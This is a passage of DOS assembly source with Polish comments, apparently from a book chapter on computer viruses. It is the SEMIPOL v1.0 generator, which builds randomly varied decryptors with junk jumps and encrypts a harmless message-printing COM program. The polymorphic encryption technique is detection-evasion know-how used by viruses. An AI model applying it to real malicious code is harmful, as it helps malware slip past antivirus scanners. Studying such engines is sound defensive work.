\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       stosb}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       call  LosowySkok                  ; wstaw losowy skok}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mov   al,74h                      ; DEKODER: JZ ??}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       stosb                             ; wstaw pierwsza czesc rozkazu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mov   Semi_DokadJZ,di             ; zostanie ustawione pozniej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       stosb                             ; zostaw miejsce na ofset}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       call  LosowySkok                  ; wstaw losowy skok}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mov  al,0E9h                      ; DEKODER: JNZ -> JMP z powrotem}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       stosb                             ; wstaw E9}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mov   ax,Semi_Petla               ; oblicz ofset do DEKODER : Petla:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       sub   ax,di                       ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       sub   ax,2                        ; odejmij dlugosc operandu w E9,????}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       stosw                             ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mov   bx,Semi_DokadJZ             ; oblicz ofset do DEKODER : Koniec:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mov   ax,di                       ; i wstaw go pod wczesniej zapamietany}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       sub   ax,bx                       ; ofset}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       dec   ax                          ; odejmij dlugosc operandu w 74,??}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mov   [bx],al                     ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mov   bx,Semi_GdziePocz           ; oblicz ofset, gdzie zaczynaja}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mov   ax,di                       ; sie dane przeznaczone do deszyfrowania}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       sub   ax,Semi_Dokad               ; z uwzglednieneim ofsetu dla}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       add   ax,100h                     ; pliku COM (ORG 100h)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mov   [bx],ax                     ; i zapisz pod zapamietany adres}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mov   cx,Semi_IleDanych           ; ile danych do kopiowania}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       lea   si,TMPBufor                 ; pobieraj z bufora zawierajacego}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       rep   movsw                       ; zaszyfrowany kod i kopiuj na koniec}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mov   cx,di                       ; oblicz, ile danych do zapisu, czyli}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       sub   cx,Semi_Dokad               ; wartosc zwracana przez procedure}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       pop   di si ax                    ; przywroc zapamietane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       ret                               ; powrot z procedury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;-----------------------------------------------------------------------------}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch LosowySkok:                             ; wstawia losowy skok}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         mov   ax,15                     ; zakres skokow 1..15}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         Call  PseudolosowaAX            ; losuj z zakresu 1..15}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         mov   ah,al                     ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         mov   al,0EBh                   ; AX=skok,EB}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         stosw                           ; zapisz EB,skok}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         mov   al,ah                     ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         mov   ah,0                      ; AX:=AL=skok}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         add   di,ax                     ; dodaj do di}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         ret                             ; powrot z procedury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Semi_IleDanych dw ?                     ; \\  potrzebne do chwilowego}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Semi_Skad      dw ?                     ;  - zachowania roznych wartosci}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Semi_Dokad     dw ?                     ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Semi_Losowa    dw ?                     ; wartosc szyfrujaca kod}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Semi_GdziePocz dw ?                     ; \\  adresy do zmiennych nieznanych}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Semi_Petla     dw ?                     ;  \\ w momencie, kiedy sa potrzebne}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Semi_DokadJZ   dw ?                     ;  / aby mozna bylo je pozniej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; /  zmienic}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch PseudoZarodek  dw ?                     ; \\ aktualny zarodek generatora liczb}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; / pseudolosowych}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch TMPBufor       db 256 dup(?)            ; \\ rozmiar tymczasowego bufora}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; - = 256 bajtow, (o rozmiarze co najmniej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; / rownym dlugosci kodu wirusa)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;-----------------------------------------------------------------------------}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch PseudoLosowa:                           ; generuje liczbe pseudolosowa}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; z zakresu 1..65535}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mov   ax,0FFFFh}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch PseudoLosowaAX:                         ; przedzial w AX}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       push  dx                          ; zachowaj na chwile DX}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       Call  ZmienPseudoZarodek          ; zmien zarodek}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mul   PseudoZarodek               ; DX:AX:=przedzial*Zarodek}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       xchg  ax,dx                       ; AX:=0..przedzial}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       inc   ax                          ; pomin zero}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       pop   dx                          ; przywroc DX ze stosu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       ret}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ZmienPseudoZarodek:                     ; zmienia PseudoZarodek}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       push  ax                          ; zachowaj stary AX}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       in    al,40h                      ; AL:=przypadkowa wartosc}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       xchg  ah,al                       ; AH:=AL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       in    al,40h                      ; AX:=przypadkowa wartosc}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       xor   ax,0ABCDh                   ; operacje pomocnicze}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       add   ax,1234h                    ; operacje pomocnicze}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mov   PseudoZarodek,ax            ; przepisz nowy zarodek}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       pop   ax                          ; przywroc stary AX}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       ret                               ; powrot z procedury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;----------------------------------------------------------------------------;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;          Programik do zaszyfrowania wyswietlajacy komunikat                ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                    przy uzyciu 09/21                                       ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;----------------------------------------------------------------------------;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch RozmiarPrzykladowegoKodu = offset KoniecKoduPrzykladowego- offset StartKoduPrzykladowego}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch StartKoduPrzykladowego:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            call TrikCALL_POP ; trik do uzyskania relatywnego ofsetu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      TrikCALL_POP:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pop   si          ; wez relatywny ofset, gdzie kod jest w pamieci}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov   dx,offset TePrzyklad-Offset StartKoduPrzykladowego-3}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            add   dx,si       ; DX:=ofset do tekstu (relatywny)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov   ah,9        ; funkcja DOS - wyswietl tekst$}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            int   21h         ; wywolaj funkcje}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            int   20h         ; powrot do DOS (program typu COM)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch TePrzyklad db CR,LF          ; tekst do wyswietlenia}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            db '[Program wygenerowany przez SEMIPOL v1.0, Autor: Adam Blaszczyk]'}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            db DOLAR}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch KoniecKoduPrzykladowego:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;-----------------------------------------------------------------------------}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch TeCopyRight             db CR,LF,'SEMIPOL v1.0, Autor : Adam Blaszczyk 1997',}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                         db CR,LF,NUL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch TeGenerator             db CR,LF,'Czekaj, generuje plik(i) ...',CR,LF,NUL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch AktualnaNazwaPliku      db 'SEMI'}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        AktNumPliku      db '0001'}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                         db '.COM',NUL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch             TeCRLF      db CR,LF,NUL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       PSP_Segment       dw ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       UchwytPliku       dw ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       LiczbaPlikow      dw ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       BuforDocelowy     db 4096 dup(?)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       StosStart         db RozmiarStosu dup(?)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       StosKoniec:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch SEMI_POL ENDS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch END Start}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 8.2.1.2. Pe\uc1\u322\'b3ny polimorfizm}{\f0\fs24\b\lang1045{\*\listtag0}\par}
